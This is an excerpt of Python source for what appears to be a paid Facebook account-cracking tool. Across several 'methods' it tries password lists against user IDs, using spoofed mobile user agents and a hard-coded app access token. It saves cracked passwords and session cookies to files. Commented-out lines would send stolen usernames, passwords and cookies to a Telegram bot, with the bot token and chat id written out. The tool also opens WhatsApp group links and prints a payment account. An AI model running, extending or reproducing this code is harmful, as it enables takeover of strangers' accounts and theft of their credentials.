...
def ugen():
    ua = f'Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]'
    ua = f'Mozilla/5.0 (iPad; CPU OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.2;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5]'
    ua = f'Mozilla/5.0 (iPad; CPU OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad5,3;FBMD/iPad;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5]'
    ua = f'Mozilla/5.0 (iPad; CPU OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]'
    ua = f'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/76.0.0.31.70;FBBV/32346928;FBRV/0;FBDV/iPad3,1;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5]'
    ua = f'Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/Viettel;FBID/tablet;FBLC/en_US;FBOP/5]'
    ua = f'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/T-Mobile;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]'
    return ua
...
def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7')
...
[<>] The Original Codes are Written by 𝐀𝐍𝐀𝐘𝐀 CHAUDHRY 
----------------------------------------------------------------------
 ╰◈▪➣ Author    : 𝐀𝐍𝐀𝐘𝐀
 ╰◈▪➣ Facebook  : ANAYA CHAUDHRY
 ╰◈▪➣ Status    : PAID TOOL
 ╰◈▪➣ Version   : 8.7.2 \033[1;37m
      \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
----------------------------------------------------------------------
OK ids will be saved in 𝐀𝐍𝐀𝐘𝐀 folder
----------------------------------------------------------------------
\033[1;97m""")
	p(logo)
def clear():
...
def buy():
	...
	print(' [•] Account Name : 𝐀𝐍𝐀𝐘𝐀')
	print(' [•] Account Number : +923096902140')
...
class DEMON:
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [𝐀𝐍𝐀𝐘𝐀] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
...
'X-FB-Server-Cluster': 'True',}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[𝐀𝐍𝐀𝐘𝐀-OK] %s | %s \033[1;97m '%(uid,pw))		
					...
					open('/sdcard/ANAYA_OK.txt','a').write(uid+'|'+pw+'\n')					
					open('/sdcard/ANAYA_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;35m[𝐀𝐍𝐀𝐘𝐀-CP] %s | %s \033[1;97m '%(uid,pw))
					...
					cp.append(uid)
					open('/sdcard/ANAYA_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[𝐀𝐍𝐀𝐘𝐀-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ANAYA] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
	...
	def method5(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ANAYA] %s | M5 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
...
'X-FB-Server-Cluster': 'True',}
				...
				if "session_key" in q:
					...
					#p('\r\033[1;35m[𝐀𝐍𝐀𝐘𝐀-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ANAYA_M5_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method6(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ANAYA] %s | M6 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			ss = random.choice(["en_US","fr_FR","ha_NG","en_GB"])
			sam = random.choice(samsung)
			net = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
			fbbv = str(random.randint(211111111,499999999))
			...
			for ps in pwx:
				...
				if "c_user" in ses.cookies.get_dict():
					...
					ok.append(uid)
					open('/sdcard/ANAYA_M6_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ANAYA_M6_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif "checkpoint" in po.cookies.get_dict():
					p('\r\033[1;91m[𝐀𝐍𝐀𝐘𝐀-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ANAYA_M6_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method7(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ANAYA] %s | M7 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			sam = random.choice(samsung)
			net = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
			fbbv = str(random.randint(211111111,499999999))
			fbav = f'{random.randint(200,450)}.0.0.{random.randint(11,99)}.{random.randint(111,399)}'
			...
			for ps in pwx:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+'\n')
					ok.append(uid)
					open('/sdcard/ANAYA_M7_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ANAYA_M7_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					#requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {cok}  )\n.√. By :- CYBER DEMON √ " )
					break
				elif "checkpoint" in q.cookies.get_dict().keys():
					p('\r\033[1;91m[𝐀𝐍𝐀𝐘𝐀-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ANAYA_M7_CP.txt','a').write(uid+'|'+pw+'\n')
					#requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. . By :- CYBER DEMON √ " )
					break
				else:
					continue
	...
	def method8(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ANAYA] %s | M8 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			...
			for ps in pwx:
				...
				if "session_key" in response.text and "EAA" in response.text:
					...
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/ANAYA_M8_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ANAYA_M8_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif "www.facebook.com" in response['error']['message']:
					p('\r\033[1;91m[𝐀𝐍𝐀𝐘𝐀-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ANAYA_M8_CP.txt','a').write(uid+'|'+pw+'\n')
					break
...
'Content-Length': '847'}
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [𝐀𝐍𝐀𝐘𝐀-OK] '+uid+' | '+pas+'\033[1;37m')
				...
				open('/sdcard/𝐀𝐍𝐀𝐘𝐀/𝐀𝐍𝐀𝐘𝐀-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{W} [𝐀𝐍𝐀𝐘𝐀-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/𝐀𝐍𝐀𝐘𝐀/𝐀𝐍𝐀𝐘𝐀-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
...
class Join:
	def __init_(self):
		logo()
		os.system("xdg-open https://wa.me/+23096902140")
	def Whatsapp(self):
		os.system("xdg-open https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7")
		DEMON().DEMON()
	def Facebook(self):
...
class automation:
	...
	def bulk_password(self):
		sav = "/sdcard/ANAYA_passwords.txt"
		try:
